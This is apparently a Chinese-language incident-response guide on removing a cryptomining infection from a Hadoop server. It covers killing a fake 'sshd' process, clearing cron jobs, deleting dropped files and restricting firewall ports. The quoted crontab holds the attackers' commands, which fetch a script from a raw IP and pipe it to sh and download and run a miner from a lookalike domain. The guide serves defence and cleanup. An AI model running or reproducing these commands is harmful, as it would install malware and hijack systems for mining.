
## 挖矿病毒监控与防护(Hadoop)

### 病毒引发的现象

<img width="958" alt="2b6c45298b0ec34a735db4f731844a3" src="https://github.com/ERST-CloudNative/OCI-Practice/assets/4653664/3b8a6544-9ff8-46c6-9ebb-b2e701299057">

可以看到，病毒程序已经几乎占用了全部CPU资源

### 病毒处理

首先，删除病毒文件与相关进程

1. 清除异常进程

```
[root@bg003 tmp]# top
top - 06:30:05 up 10 min,  1 user,  load average: 8.00, 6.82, 3.68
Tasks: 212 total,   1 running, 210 sleeping,   0 stopped,   1 zombie
%Cpu(s): 99.7 us,  0.1 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.2 st
MiB Mem :  15719.7 total,  12350.6 free,   2875.6 used,    493.4 buff/cache
MiB Swap:   4096.0 total,   4096.0 free,      0.0 used.  12505.5 avail Mem

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
   3487 root       5 -15 2455268   8044   4036 S 796.3   0.0  74:27.57 sshd
   1597 root      20   0  405220  28436  15480 S   0.3   0.2   0:00.95 tuned
      1 root      20   0  241908  12176   8740 S   0.0   0.1   0:01.18 systemd
      2 root      20   0       0      0      0 S   0.0   0.0   0:00.00 kthreadd
      3 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_gp
      4 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 rcu_par_gp
      5 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 slub_flushwq
      6 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 netns
[root@bg003 tmp]# kill -9 3487
```

2. 清除恶意的定时程序

```
[root@bg003 ~]# crontab -l
* * * * * wget -q -O - http://185.122.204.197/h2.sh | sh > /dev/null 2>&1

0 */6 * * * /usr/bin/flock -n /var/tmp/tmp.lock -c 'cd /var/tmp; wget -nc http://main.cloudfronts.net/dns/sshd; cd /var/tmp; chmod 777 sshd; cd /var/tmp; curl http://main.cloudfronts.net/dns/sshd -o sshd; cd /var/tmp; chmod 777 sshd; cd /var/tmp; wget -nc http://main.cloudfronts.net/dns/config.json; cd /var/tmp; curl http://main.cloudfronts.net/dns/config.json -o config.json'
* * * * * /usr/bin/flock -n /var/tmp/vm.lock -c 'cd /var/tmp; ./sshd'
[root@bg003 ~]# crontab -r

```

3. 分析恶意定时程序

基于对恶意定时任务的分析，删除其相关文件和程序

```
[root@bg003 tmp]# ls
config.json  systemd-private-6e3a276b6c024c0d941e659b236eb4a7-chronyd.service-Q9th7a                   tmp.lock
sshd         systemd-private-6e3a276b6c024c0d941e659b236eb4a7-unified-monitoring-agent.service-JLJ1L6  vm.lock
[root@bg003 tmp]# rm -f sshd
[root@bg003 tmp]# rm -f config.json tmp.lock vm.lock
[root@bg003 tmp]# ls
systemd-private-6e3a276b6c024c0d941e659b236eb4a7-chronyd.service-Q9th7a
systemd-private-6e3a276b6c024c0d941e659b236eb4a7-unified-monitoring-agent.service-JLJ1L6
```
4. 调整防火墙配置

建议仅开启需要对外暴露的端口，而不是暴露全部端口。

